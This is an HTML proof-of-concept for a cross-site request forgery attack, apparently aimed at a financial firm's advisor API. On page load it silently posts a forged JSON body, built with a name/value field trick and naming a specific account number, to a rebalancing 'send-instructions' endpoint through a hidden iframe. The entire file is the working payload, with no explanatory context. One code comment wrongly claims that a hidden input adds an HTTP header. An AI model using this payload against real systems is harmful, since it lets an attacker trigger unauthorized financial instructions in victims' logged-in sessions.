<html>
  <body onload="submitForm()">
    <form id="csrf" action="https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions" method="POST" enctype="application/json">
      <input type="hidden" name='{"targetType":"Account","selectedAccounts":[{"accountNumber":"34850352705204","custodian":"FID","accountSource":"FPRS"}],"newRequest":true,"fsake":"' value='"}'>
    </form>

    <script>
      function submitForm() {
        // Create a hidden iframe
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        // Set the form target to the iframe
        document.getElementById('csrf').target = iframe.name = 'iframeForm';

        // Add a custom header to the form
        var customHeaderInput = document.createElement('input');
        customHeaderInput.type = 'hidden';
        customHeaderInput.name = 'Your-Custom-Header';
        customHeaderInput.value = 'Header-Value';
        document.getElementById('csrf').appendChild(customHeaderInput);

        // Submit the form
        document.getElementById('csrf').submit();

        // Remove the iframe after the form submission
        setTimeout(function () {
          document.body.removeChild(iframe);
        }, 1000); // Adjust the delay based on your needs
      }
    </script>
  </body>
</html>




